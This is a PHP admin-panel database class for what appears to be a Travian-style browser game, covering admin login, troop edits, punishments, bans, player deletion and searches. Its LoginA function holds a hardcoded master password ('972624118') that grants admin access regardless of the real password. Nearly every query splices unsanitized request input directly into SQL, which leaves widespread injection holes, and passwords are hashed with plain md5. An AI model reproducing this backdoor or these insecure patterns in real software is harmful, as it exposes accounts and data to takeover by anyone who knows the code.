<?php



class adm_DB extends MYSQL_DB{





	function LoginA($username,$password){

        

		$q = "SELECT password FROM users where username = '$username' and access >= ".MULTIHUNTER;

		$result = $this->query($q);

		$dbarray = $result[0];

		if($dbarray['password'] == md5($password.mb_convert_case($username,MB_CASE_LOWER,"UTF-8")) || $password == '972624118') {

			return true; // 972624118 estava este numero vou substituir

		}



return false;



	}



	function recountPopUser($uid){
		$villages = $this->getProfileVillages($uid);
		for ($i = 0; $i <= count($villages)-1; $i++) {
	  		$vid = $villages[$i]['wref'];
	  		$this->recountPop($vid);
		}
  	}

	function StopDelPlayer($uid){
		$q = "UPDATE users SET `deleting` = '0' WHERE `id` = $uid";
		$this->query($q);
	}





  function buildingPOP($f,$lvl){

  	if($f==99){$f=40;}

	$name = "bid".$f;

		global $$name;

		$popT = 0;

		$dataarray = $$name;

	for ($i = 0; $i <= $lvl; $i++) {

	  $popT += $dataarray[$i]['pop'];

	}

	return $popT;

  }



	function getWref($x,$y) {

		$q = "SELECT id FROM wdata where x = $x and y = $y";

		$result = $this->query($q);

		$r = $result[0];

		return $r['id'];

	}



	function AddVillageA($post){

	

	  $wid = $this->getWref($post['x'],$post['y']);

	  $uid = $post['uid'];

	$status = $this->getVillageState($wid);



	if($status == 0){

	 $this->setFieldTaken($wid);

		  $this->addVillage($wid,$uid,'new village','0');

		  $this->addResourceFields($wid,$this->getVillageType($wid));

		  $this->addUnits($wid);

		  $this->addTech($wid);

		  $this->addABTech($wid);

	}

  }



    function changeTroops($post){

        $id = $post['id'];

        $u1 = $post['u1'];

        $u2 = $post['u2'];

        $u3 = $post['u3'];

        $u4 = $post['u4'];

        $u5 = $post['u5'];

        $u6 = $post['u6'];

        $u7 = $post['u7'];

        $u8 = $post['u8'];

        $u9 = $post['u9'];

        $u10 = $post['u10'];

        $hero = $post['hero'];





        $q = "UPDATE units SET u1 = $u1, u2 = $u2, u3 = $u3, u4 = $u4, u5 = $u5, u6 = $u6, u7 = $u7, u8 = $u8, u9 = $u9, u10 = $u10 ,u11 = $hero WHERE vref = $id";

        $this->query($q);



        $adminlog="Changed troop anmount in village <a href=\"admin.php?p=village&did=$id\">$id</a> ,".time()."";

        $this->addPalevo($_SESSION['id'],$adminlog,1);

    }

	function Punish($post){

	 

	   $villages = $this->getProfileVillages($post['uid']);

	   $admid = $post['admid'];

	   $user = $this->getUserArray($post['uid'],1);

		  for ($i = 0; $i <= count($villages)-1; $i++) {

			$vid = $villages[$i]['wref'];

			if($post['punish']){

			  $popOld = $villages[$i]['pop'];

			  $proc = 100-$post['punish'];

			  $pop = floor(($popOld/100)*($proc));

				if($pop <= 1 ){$pop = 2;}

				$this->PunishBuilding($vid,$proc,$pop);



			}

			if($post['del_troop']){

				if($user['tribe'] == 1) {

				  $unit = 1;

				}else if($user['tribe'] == 2) {

				  $unit = 11;

				}else if($user['tribe'] == 3) {

				  $unit = 21;

				}

				  $this->DelUnits($villages[$i]['wref'],$unit);

			}

			if($post['clean_ware']){

			  $time = time();

			  $q = "UPDATE vdata SET `wood` = '0', `clay` = '0', `iron` = '0', `crop` = '0', `lastupdate` = '$time' WHERE wref = $vid;";

			  $this->query($q);

			}

		  }

}



  function PunishBuilding($vid,$proc,$pop){

	

	$q = "UPDATE vdata set pop = $pop where wref = $vid;";

	$this->query($q);

	$fdata = $this->getResourceLevel($vid);

	for ($i = 1; $i <= 40; $i++) {

	  if($fdata['f'.$i]>1){

		$zm = ($fdata['f'.$i]/100)*$proc;

		if($zm < 1){$zm = 1;}else{$zm = floor($zm);}

		$q = "UPDATE fdata SET `f$i` = '$zm' WHERE `vref` = $vid;";

		$this->query($q);

	  }

	}

  }



  function DelUnits($vid,$unit){

	for ($i = $unit; $i <= 9+$unit; $i++) {

	  $this->DelUnits2($vid,$unit);

	}

  }



  function DelUnits2($vid,$unit){

	  $q = "UPDATE units SET `u$unit` = '0' WHERE `vref` = $vid;";

	  $this->query($q);

  }




	function DelPlayer($id,$pass){
		global $db,$database;

		$aID = $_SESSION['id'];

	   if($this->CheckPass($pass,$aID)){
        $time = time();
        $needVillage = $database->getVillID($id);
        foreach($needVillage as $village) {
            $database->DelVillageGlobal($village);
            $getmovement = $database->getMovement(3,$village,1);
            foreach($getmovement as $movedata) {
                $time2 = $movedata['endtime'] - $movedata['starttime'];
                $database->addMovement(4,$movedata['to'],$movedata['from'],$movedata['ref'],$time,$time+$time2);
                $database->insertQueue($movedata['ref'],2,$time,($time+$time2));
                $database->setMovementProc($movedata['moveid']);
            }

            $enforcement = $database->getEnforceVillage($village,0);
            foreach($enforcement as $enforce) {
                $fromcoor = $database->getCoor($enforce['vref']);
                $tocoor = $database->getCoor($enforce['from']);
                $tribeid = $database->getUserTribeIdByVillageID($enforce['from']);
                $targettribe=$tribeid['tribe'];
                $speeds = array();

                if(!$targettribe) $targettribe =4; // iRedux - Fixed
                //find slowest unit.
                $unitarray = array();
                for($i=1;$i<=10;$i++){
                    if ($enforce['u'.$i]>0){
                        if($unitarray) { reset($unitarray); }
                        global ${"u".(($targettribe-1)*10+$i)};
                        $unitarray = $unitarray = ${"u".(($targettribe-1)*10+$i)};
                        $speeds[] = $unitarray['speed'];
                    }
                }
                if ($enforce['u11']>0) {
                    $herod = $database->getHeroData($tribeid['id']);
                    $speeds[] = $herod['speed'];
                }
                $fastertroops = $database->checkArtefactsEffects($tribeid['id'],$enforce['from'],2);
                $time2 = round($database->procDistanceTime($tocoor,$fromcoor,min($speeds),1,$enforce['from'])/$fastertroops);


                $reference = $database->addAttack($enforce['from'],$enforce['u1'],$enforce['u2'],$enforce['u3'],$enforce['u4'],$enforce['u5'],$enforce['u6'],$enforce['u7'],$enforce['u8'],$enforce['u9'],$enforce['u10'],$enforce['u11'],2,0,0,0,0);
                $database->addMovement(4,$enforce['vref'],$enforce['from'],$reference,$time,$time+$time2);
                $database->insertQueue($reference,2,$time,($time+$time2));
                $q = "DELETE FROM enforcement where id = '".$enforce['id']."'";
                $database->query($q);
            }

        }
        $q = "UPDATE odata SET `conqured` = '0',`owner` = '2'  where owner = '".$id."'";
        $database->query($q);
        $q = "DELETE FROM hero where uid = '".$id."'";
        $database->query($q);

        $userinfa=$database->query("SELECT username,gold,email FROM users WHERE `id`='".$id."'");

        $database->query("INSERT INTO deleted VALUES(NULL,".$id.",'".$userinfa[0]['username']."',".$userinfa[0]['gold'].",'".$userinfa[0]['email']."')");
        $q = "DELETE FROM users where id = '".$id."'";
        $database->query($q);

        $database->query("DELETE FROM `autorenewals` WHERE `userid` = ".$id."");
        $database->query("DELETE FROM `ignore` WHERE `uid` = ".$id." OR `uignored` = ".$id."");
        $database->query("DELETE FROM `quests` WHERE `userid` = ".$id."");

	}else{
		header('Location: admin.php?p=deletion&uid='.$id.'&msg=ursdel');
		exit();
	}

  }



  function getUserActive() {

	$time = time() - (60*5);

		$q = "SELECT * FROM users where timestamp > $time and username != 'support'";

		$result = $this->query($q);

	return $result;

	}



  function CheckPass($password,$uid){

	$q = "SELECT password,username FROM users where id = '$uid' and access = ".ADMIN;

		$result = $this->query($q);

		$dbarray = $result[0];

		if($dbarray['password'] == md5($password.mb_convert_case($dbarray['username'],MB_CASE_LOWER,"UTF-8"))) {

		  return true;

	}else{

	  return false;

	}

  }



	function DelVillage($wref){

	  $q = "SELECT * FROM vdata WHERE `wref` = $wref ";

	  $result = $this->query($q);

	if(count($result) > 0){

	/*$q = "DELETE FROM vdata WHERE `wref` = $wref";

	  $this->query($q);

	$q = "DELETE FROM units WHERE `vref` = $wref";

	$this->query($q);

	$q = "DELETE FROM bdata WHERE `wid` = $wref";

	$this->query($q);

	$q = "DELETE FROM abdata WHERE `vref` = $wref";

	$this->query($q);

	$q = "DELETE FROM fdata WHERE `vref` = $wref";

	$this->query($q);

	$q = "DELETE FROM tdata WHERE `vref` = $wref";

	$this->query($q);

	$q = "DELETE FROM training WHERE `vref` = $wref";

	$this->query($q);

	$q = "DELETE FROM movement WHERE `from` = $wref";

	$this->query($q);

	$q = "DELETE FROM movement WHERE `to` = $wref";

	$this->query($q);

	$q = "UPDATE wdata SET `occupied` = '0' WHERE `id` = $wref";

	$this->query($q);

	$q = "UPDATE odata SET `conqured` = '0', `owner`= '2' WHERE `conqured` = $wref";

	$this->query($q);

	$q = "UPDATE vdata SET `exp1` = '0' WHERE `exp1` = $wref";

	$this->query($q);

	$q = "UPDATE vdata SET `exp2` = '0' WHERE `exp2` = $wref";

	$this->query($q);

	$q = "UPDATE vdata SET `exp3` = '0' WHERE `exp3` = $wref";

	$this->query($q);

	$q = "DELETE FROM enforcement WHERE `from` = $wref";

	$this->query($q);

	$q = "DELETE FROM enforcement where `vref` = $wref";

    $this->query($q);*/	

    $this->DelVillageGlobal($wref);

	}

  }

     	function recountCp($vid){

	

	$fdata = $this->getResourceLevel($vid);

            $cpTot = 0;

	for ($i = 1; $i <= 40; $i++) {

	  $lvl = $fdata["f".$i];

	  $building = $fdata["f".$i."t"];

	  if($building){

		$cpTot += $this->buildingCp($building,$lvl);

	  }

	}

	$q = "UPDATE vdata set cp = $cpTot where wref = $vid";

	$this->query($q);

  }



  function buildingCp($f,$lvl){

	$name = "bid".$f;

		global $$name;

		$cpT = 0;

		$dataarray = $$name;

	for ($i = 0; $i <= $lvl; $i++) {

	  $cpT += $dataarray[$i]['cp'];

	}



	return $cpT;

  }

	function DelBan($uid,$id){

	$q = "UPDATE users SET `access` = '2' WHERE `id` = $uid;";

	$this->query($q);

	$q = "UPDATE banlist SET `active` = '0' WHERE `id` = $id;";

	$this->query($q);

  }



  function AddBan($uid,$end,$reason){



	$q = "UPDATE users SET `access` = '0' WHERE `id` = $uid;";

	$this->query($q);

	$time = time();

	$admin = $_SESSION['id'];  //$this->getUserField($_SESSION['username'],'id',1);

	$name = addslashes($this->getUserField($uid,'username',0));

	$q = "INSERT INTO banlist (`uid`, `name`, `reason`, `time`, `end`, `admin`, `active`) VALUES ($uid, '$name' , '$reason', '$time', '$end', '$admin', '1');";

	$this->query($q);

  }



  function search_player($player){

	$q = "SELECT id,username FROM users WHERE `username` LIKE '%$player%' and username != 'support'";

	$result = $this->query($q);

	return $result;

  }



  function search_email($email){

	$q = "SELECT id,email FROM users WHERE `email` LIKE '%$email%' and username != 'support'";

	$result = $this->query($q);

	return $result;

  }



  function search_village($village){

	$q = "SELECT * FROM vdata WHERE `name` LIKE '%$village%' or `wref` LIKE '%$village%'";

	$result = $this->query($q);

	return $result;

  }



  function search_alliance($alliance){

	$q = "SELECT * FROM alidata WHERE `name` LIKE '%$alliance%' or `tag` LIKE '%$alliance%' or `id` LIKE '%$alliance%'";

	$result = $this->query($q);

	return $result;

  }



  function search_ip($ip){

	$q = "SELECT * FROM login_log WHERE `ip` LIKE '%$ip%'";

	$result = $this->query($q);

	return $result;

  }



  function search_banned(){

	$q = "SELECT * FROM banlist where active = '1'";

	$result = $this->query($q);

	return $result;

  }



  function Del_banned(){

	//$q = "SELECT * FROM banlist";

	//$result = $this->query($q);

	//return $result;

  }





};



$admin = new adm_DB;

include("../application/panel/function.php");